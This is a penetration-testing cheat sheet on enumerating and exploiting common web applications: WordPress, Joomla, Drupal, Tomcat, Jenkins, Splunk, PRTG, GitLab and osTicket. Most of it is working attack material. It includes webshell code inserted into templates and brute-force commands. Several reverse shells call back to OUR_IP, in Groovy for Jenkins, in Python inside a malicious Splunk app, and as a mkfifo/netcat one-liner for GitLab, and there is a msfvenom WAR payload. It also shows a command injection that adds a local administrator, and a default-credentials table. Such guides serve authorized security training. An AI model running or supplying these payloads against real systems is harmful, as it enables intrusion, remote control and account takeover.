---
title: "Attacking Common Applications"
description: "WordPress, Joomla, Drupal, Tomcat, Jenkins, and Splunk."
sidebar:
  order: 10
  label: "Attacking Common Applications"
---
> Enumeration and exploitation of common applications: CMS (WordPress, Joomla, Drupal), application servers (Tomcat, Jenkins), SIEM/monitoring (Splunk, PRTG), and collaborative tools (GitLab, osTicket).

---


## Discovery

```bash
# Initial Nmap discovery
nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list

# Massive screenshotting of web apps
eyewitness --web -x web_discovery.xml -d screenshots/
cat web_discovery.xml | aquatone -nmap   # alternative

# Individual service
sudo nmap --open -sV TARGET_IP
```

```bash
# Add vhosts to /etc/hosts
IP=10.129.42.195
printf "%s\t%s\n" "$IP" "app.inlane.local dev.inlane.local blog.inlane.local" | sudo tee -a /etc/hosts
```

---

## WordPress

### Fingerprint

```bash
curl -s http://blog.target.local | grep WordPress    # version in meta generator
curl -s http://blog.target.local/ | grep themes      # active theme
curl -s http://blog.target.local/ | grep plugins     # plugins with version in src

# Robots.txt and structure
curl -s http://blog.target.local/robots.txt          # /wp-admin/ present = WordPress
# Admin panel: /wp-admin/ -> /wp-login.php
# Plugins: /wp-content/plugins/
# Themes: /wp-content/themes/
```

```bash
# WPScan — complete enumeration
sudo wpscan --url http://blog.target.local --enumerate --api-token TOKEN

# Brute force (xmlrpc is faster)
sudo wpscan --password-attack xmlrpc -t 20 -U admin,john \
  -P /usr/share/wordlists/rockyou.txt --url http://blog.target.local
```

### RCE (Admin Access)

```bash
# Method 1: Theme Editor
# Appearance -> Theme Editor -> Select INACTIVE theme (e.g. Twenty Nineteen)
# Edit 404.php -> add: system($_GET[0]);
# Save -> http://target/wp-content/themes/twentynineteen/404.php?0=id

curl http://blog.target.local/wp-content/themes/twentynineteen/404.php?0=id

# Method 2: MSF plugin upload
use exploit/unix/webapp/wp_admin_shell_upload
set USERNAME john
set PASSWORD firebird1
set RHOSTS TARGET_IP
set VHOST blog.target.local
exploit

# Method 3: Plugin LFI (mail-masta 1.0)
curl -s "http://blog.target.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
```

### Default Credentials

| Username | Password |
|---------|----------|
| admin | admin |
| admin | password |

---

## Joomla

### Fingerprint

```bash
curl -s http://dev.target.local | grep Joomla         # meta generator
curl -s http://dev.target.local/README.txt | head -5  # version in "version 3.x"
curl -s http://dev.target.local/administrator/manifests/files/joomla.xml | xmllint --format -
# -> <version>3.9.4</version>

# Tools
droopescan scan joomla --url http://dev.target.local/
python2.7 joomlascan.py -u http://dev.target.local   # accessible components

# Admin panel: /administrator/
```

```bash
# Brute force admin
sudo python3 joomla-brute.py -u http://dev.target.local \
  -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
# → admin:admin
```

### RCE (Admin Access)

```bash
# Template editor -> Extensions -> Templates -> Select template -> edit error.php
# Add: system($_GET['HASH']);
# Save -> http://dev.target.local/templates/protostar/error.php?HASH=id

curl -s "http://dev.target.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id"

# CVE-2019-10945 — Directory Traversal (Joomla 1.5.0 – 3.9.4)
python2.7 joomla_dir_trav.py --url "http://dev.target.local/administrator/" \
  --username admin --password admin --dir /
```

---

## Drupal

### Fingerprint

```bash
curl -s http://drupal.target.local | grep Drupal
curl -s http://drupal-acc.target.local/CHANGELOG.txt | grep -m2 ""  # Drupal 7.57
# Nodes at /node/1, /node/2... = Drupal
# Panel admin: /user/login

droopescan scan drupal -u http://drupal.target.local
```

### RCE (Admin Access)

```bash
# Drupal 7 — PHP Filter Module (enable in /admin/modules)
# Content -> Add content -> Basic page -> Text format: PHP code
# <?php system($_GET['HASH']); ?>
# -> http://drupal-qa.target.local/node/3?HASH=id

# Drupal 8+ — Install PHP Filter module
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
# Admin -> Reports -> Available updates -> Install new module -> upload tar.gz

# Backdoored module (CAPTCHA)
wget https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
# Create shell.php + .htaccess -> compress -> upload as module
# Access: /modules/captcha/shell.php?HASH=id
```

### Drupalgeddon CVEs

```bash
# Drupalgeddon (CVE-2014-3704) — SQLi preauth -> create admin (Drupal 7.0-7.31)
python2.7 drupalgeddon.py -t http://drupal-qa.target.local -u hacker -p pwnd

# Drupalgeddon2 (CVE-2018-7600) — RCE preauth (Drupal < 7.58 / 8.5.1)
python3 drupalgeddon2.py
# Modify echo in the script to upload PHP webshell
curl http://drupal-dev.target.local/mrb3n.php?HASH=id

# Drupalgeddon3 (CVE-2018-7602) — Authenticated RCE (MSF)
use exploit/multi/http/drupal_drupageddon3
set drupal_session SESS45ecfcb93...=TOKEN
set DRUPAL_NODE 1
exploit
```

---

## Apache Tomcat

### Fingerprint

```bash
# Error 404 reveals version; also /docs/
curl -s http://target:8080/docs/ | grep Tomcat

# Key structure
# /manager/html -> WAR upload (requires manager-gui)
# /host-manager/html
# conf/tomcat-users.xml -> credentials (if accessible via LFI)
# webapps/ -> application directory
```

### Manager Brute Force

```bash
# MSF
use auxiliary/scanner/http/tomcat_mgr_login
set VHOST web01.target.local
set RPORT 8180
set stop_on_success true
set rhosts TARGET_IP
run

# Common Tomcat credentials
# tomcat:tomcat, tomcat:admin, admin:admin, admin:manager, manager:manager
```

### WAR Upload → RCE

```bash
# Manual method
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp
# Manager GUI -> Deploy -> upload backup.war
# -> http://target:8080/backup/cmd.jsp?cmd=id

# msfvenom WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=OUR_IP LPORT=4443 -f war > backup.war
nc -lnvp 4443
# Upload WAR -> click /backup in the Manager

# Automatic MSF
use exploit/multi/http/tomcat_mgr_upload
```

### CVE-2020-1938 Ghostcat (AJP LFI — Tomcat < 9.0.31)

```bash
nmap -sV -p 8009,8080 target           # verify AJP on 8009
python2.7 tomcat-ajp.lfi.py target -p 8009 -f WEB-INF/web.xml
# Only reads files inside webapps/
```

### CVE-2019-0232 (CGI enableCmdLineArguments — Windows)

```bash
# Find CGI scripts
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://target:8080/cgi/FUZZ.cmd
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://target:8080/cgi/FUZZ.bat

# Command injection via query string (Windows)
curl "http://target:8080/cgi/script.bat?&dir"
curl "http://target:8080/cgi/script.bat?&whoami"
```

---

## Jenkins

### Fingerprint

```bash
# Default port: 8080 (also 8000)
# Slave port: 5000
# Login at /login -> Jenkins own database or LDAP
# Test admin:admin or access without authentication
```

### RCE — Script Console

```
http://jenkins.target.local:8000/script
```

```groovy
// Linux — execute command
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout

// Linux — reverse shell
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/OUR_IP/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

```groovy
// Windows — execute command
def cmd = "cmd.exe /c whoami".execute();
println("${cmd.text}");

// Windows — reverse shell
String host="OUR_IP";
int port=8443;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

```bash
nc -lvnp 8443   # listener
# Alternative MSF:
use exploit/multi/http/jenkins_script_console
```

---

## Splunk

### Fingerprint

```bash
# Port: 8000 (web), 8089 (management REST API)
# Default credentials: admin:changeme (old versions)
# Free trial -> Free without authentication after 60 days

sudo nmap -sV TARGET_IP | grep -i splunk
```

### RCE — Custom App (Scripted Input)

```bash
# Malicious app structure
mkdir -p splunk_shell/{bin,default}

# bin/rev.py (Linux)
cat > splunk_shell/bin/rev.py << 'EOF'
import sys,socket,os,pty
ip="OUR_IP"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
EOF

# bin/run.ps1 (Windows)
# $client = New-Object System.Net.Sockets.TCPClient('OUR_IP',443);...

# bin/run.bat (Windows — launcher)
echo '@ECHO OFF' > splunk_shell/bin/run.bat
echo 'PowerShell.exe -exec bypass -w hidden -Command "& '"'"'%~dpn0.ps1'"'"'"' >> splunk_shell/bin/run.bat
echo 'Exit' >> splunk_shell/bin/run.bat

# default/inputs.conf
cat > splunk_shell/default/inputs.conf << 'EOF'
[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
EOF

# Compress and upload
tar -cvzf updater.tar.gz splunk_shell/

# Splunk GUI: Apps -> Install app from file -> upload updater.tar.gz
# Automatically executes the script -> reverse shell
sudo nc -lnvp 443
```

---

## PRTG Network Monitor

### Fingerprint

```bash
# Port: 8080 (or 80/443)
# Identify: "Paessler PRTG" in Nmap or EyeWitness headers
# Default credentials: prtgadmin:prtgadmin
# Version in: http://TARGET:8080/index.htm (grep "version")
curl -s http://TARGET:8080/index.htm -A "Mozilla/5.0" | grep version
```

### CVE-2018-9276 — Authenticated Command Injection

```bash
# PRTG < 18.2.39 — injection in notification Parameter field
# Setup -> Account Settings -> Notifications -> Add new notification
# -> Tick "EXECUTE PROGRAM"
# -> Program File: "Demo exe notification - outfile.ps1"
# -> Parameter: test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
# -> Save -> Test (executes the command)

# Verify local admin access
sudo crackmapexec smb TARGET_IP -u prtgadm1 -p 'Pwn3d_by_PRTG!'
```

---

## GitLab

### Fingerprint and Enumeration

```bash
# Login: /users/sign_in
# Admin panel: /admin
# Explore public: /explore
# Version: only in /help (requires login)

# User enumeration (if self-registration is enabled)
./gitlab_userenum.sh --url http://gitlab.target.local:8081/ --userlist users.txt

# Valid username if 200 response; invalid if 302
# Registration error "Username is already taken" -> confirms existing user
```

### Authenticated RCE (GitLab CE 13.10.2 — CVE-2021-22205)

```bash
# ExifTool metadata RCE via uploaded image
python3 gitlab_13_10_2_rce.py \
  -t http://gitlab.target.local:8081 \
  -u hacker -p Password1 \
  -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc OUR_IP 8443 >/tmp/f'

nc -lnvp 8443
```

---

## osTicket

### Attacks

```bash
# If ticket creation is allowed: obtain internal company email assigned to the ticket
# -> use that email to register on other services (Slack, GitLab, etc.)

# If support user credentials are held:
# Search tickets for cleartext passwords (password resets, etc.)
# Export address book -> user list for password spray
```

---

## Default Credentials Table

| Application | Username | Password |
|-----------|---------|----------|
| Tomcat Manager | tomcat | tomcat |
| Tomcat Manager | admin | admin |
| Tomcat Manager | tomcat | admin |
| Jenkins | admin | admin |
| Splunk | admin | changeme |
| PRTG | prtgadmin | prtgadmin |
| Joomla | admin | admin |
| WordPress | admin | admin |

---

## Pitfalls / Gotchas

- **WPScan without API key:** enumerates plugins but without vulnerability details. Register at wpvulndb.com for a free token (25 req/day).
- **WordPress theme inactive:** always edit an INACTIVE theme (e.g., Twenty Nineteen) to avoid breaking the site.
- **Joomla brute force:** the error page is generic ("Username and password do not match") → does not reveal if the user exists.
- **Drupal PHP Filter in v8+:** not installed by default. Installing it modifies the system → ask the client for permission.
- **Tomcat WAR undeploy:** always perform `Undeploy` after the pentest to clean up the webshell.
- **Ghostcat (AJP):** only reads files inside `webapps/`, cannot read `/etc/passwd`.
- **Jenkins as SYSTEM/root:** very common internally. Script console → immediate RCE as SYSTEM.
- **Splunk free/trial:** after 60 days it becomes Free without authentication. Look for it in internal networks.
- **PRTG — blind injection:** the command executes but there is no visible output. Add a user and verify with crackmapexec.
- **GitLab user enumeration:** registering with an already taken username shows "is already taken". Valid even without active self-registration (browsing to /users/sign_up).
- **osTicket email abuse:** if the helpdesk assigns internal emails to tickets, they can be used to register on internal services.
- **Post-pentest artifacts:** always document uploaded webshells, created users, and modified files. List them in the report appendix.

---

## Related Cheatsheets

- [File Upload Attacks](/en/metodologias/web/file-upload-attacks/) — WAR/zip/plugin upload → RCE in Tomcat, WordPress, Drupal
- [Login Brute Forcing](/en/metodologias/web/login-brute-forcing/) — brute force of admin panels with hydra/wpscan/MSF
- [Using the Metasploit Framework](/en/metodologias/exploitation/metasploit-framework/) — modules for Tomcat, Jenkins, WordPress, Drupal
- [SQL Injection Fundamentals](/en/metodologias/web/sql-injection-fundamentals/) — Drupalgeddon via SQLi preauth
- [File Inclusion](/en/metodologias/web/file-inclusion/) — Ghostcat AJP to read WEB-INF/web.xml
- [Active Directory Enumeration & Attacks](/en/metodologias/active-directory/active-directory-enumeration-attacks/) — Jenkins/Splunk as SYSTEM → foothold in AD
